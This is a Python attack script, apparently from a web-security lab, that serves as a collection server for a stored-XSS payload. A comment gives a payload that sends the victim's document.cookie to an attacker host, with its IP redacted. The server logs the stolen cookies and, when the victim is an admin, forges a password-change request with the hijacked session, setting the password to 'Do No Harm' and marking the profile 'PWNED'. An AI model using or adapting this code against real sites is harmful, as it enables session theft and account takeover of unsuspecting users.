#!/bin/python3

import socketserver
import requests


# WARNING:
#===============================================================================
# Sensitive IP addresses have been removed from this script for security reasons.
# At the moment, this script will not run properly because said IP addresses have
# been expunged and replaced with the string "<--EXPUNGED IP-->".
#===============================================================================
#
# HTTP Listning Post script used in conjuction with an XSS Payload:
# <script>fetch("http://<--EXPUNGED IP-->:9999",{method:"POST",body:"Body: "+document.cookie}).then(data=>{return data.json}).then(res=>{console.log(res)}).catch(error=>{console.log()})</script>
#

# Operations to run after handling XSS request
def Run(req, headers, body):
    # Display and log XSS request
    #---------------------------------------------------------------------------
    with open('requests.log', 'w+') as file:
        print('\t' + req)
        file.write('\t' + req + '\n')
        for x in headers.keys():
            print('\t' + x, end=': ')
            file.write('\t' + x + ': ')
            print(headers[x])
            file.write(headers[x] + '\n')
        if body:
            print('\t' + body)
            file.write('\t' + body + '\n')
        print()
        file.write('\n')
    #---------------------------------------------------------------------------

    # Check if XSS request is from an admin user
    if body:
        is_admin = False
        cookies = body.split(';')
        for x in cookies:
            if x.strip().split('=')[0] == 'uid':
                uid = x.strip().split('=')[1]
            if x.strip().split('=')[0] == 'username':
                username = x.strip().split('=')[1]
            if x.strip().split('=')[0] == 'username':
                if x.strip().split('=')[1] == 'admin':
                    is_admin = True

        # Forge password change request if admin and change password to "Do No Harm"
        if is_admin:
            print('[+]Is Admin')
            new_password = "Do No Harm"

            Url = "http://<--EXPUNGED IP-->/portal/index.php?page=edit-account-profile.php&uid="+uid

            new_headers = {}
            new_headers['Host'] = "<--EXPUNGED IP-->"
            new_headers['User-Agent'] = "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
            new_headers['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            new_headers["Accept-Language"] = "en-US,en;q=0.5"
            new_headers["Accept-Encoding"] = "gzip, deflate"
            new_headers['Referer'] = Url
            new_headers['Content-Type'] = "application/x-www-form-urlencoded"
            new_headers['Origin'] = "http://<--EXPUNGED IP-->"
            new_headers['Cookie'] = body[6:]
            new_headers['DNT'] = "1"
            new_headers['Connection']= "close"

            data = {
                "csrf-token":"",
                "username":username,
                "password":new_password,
                "confirm_password":new_password,
                "my_signature":"PWNED",
                "edit-account-profile-php-submit-button":"Update+Profile"
            }

            with open('requests.log', 'w+') as file:
                # Display and log password change request
                #---------------------------------------------------------------
                print("[+]Sending Password Change request")
                file.write("[+]Sending Password Change request\n")
                print("HEADERS:")
                file.write("HEADERS:\n")
                for x in new_headers.keys():
                    print('\t' + x, end=': ')
                    file.write('\t' + x + ': ')
                    print(new_headers[x])
                    file.write(new_headers[x] + '\n')
                print("DATA:")
                file.write("DATA:\n")
                for x in data.keys():
                    print('\t' + x, end=': ')
                    file.write('\t' + x + ': ')
                    print(data[x])
                    file.write(data[x] + '\n')
                print()
                file.write('\n')
                #---------------------------------------------------------------

                # Send forged password change request
                response = requests.post(Url, headers=new_headers, data=data)

                # Display and log HTTP status code
                #---------------------------------------------------------------
                print("[*]HTTP Status: " + str(response.status_code))
                print()
                file.write("[*]HTTP Status: " + str(response.status_code) + "\n")
                #---------------------------------------------------------------

# Parse the XSS request for desired information (cookies)
def ParseRequest(h):
    req = h.split('\\r\\n', 1)[0]
    if "POST" in req:
        top, body = h.split('\\r\\n\\r\\n', 1)
        req, heads = top.split('\\r\\n', 1)
    else:
        body = None
        req, heads = h.split('\\r\\n', 1)

    heads = heads.split('\\r\\n')

    headers = {}
    for x in heads:
        y = x.split(':', 1)
        headers[y[0]] = y[1].strip()

    return req, headers, body

# Generic TCP server modified to handle HTTP Requests
class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print("{} request:".format(self.client_address[0]))
        self.data = self.request.recv(1024).strip()
        req, headers, body = ParseRequest(str(self.data)[2:-1])

        # Send HTTP 200 OK response
        resp = b""
        resp += b"HTTP/1.1 200 OK\r\n"
        resp += b"Access-Control-Allow-Headers:*\r\n"
        resp += b"Access-Control-Allow-Origin:*\r\n"
        resp += b"Content-Length: 0\r\n"
        resp += b"Connection: close\r\n\r\n"

        self.request.sendall(resp)

        Run(req, headers, body);

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 9999
    with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
        server.serve_forever()
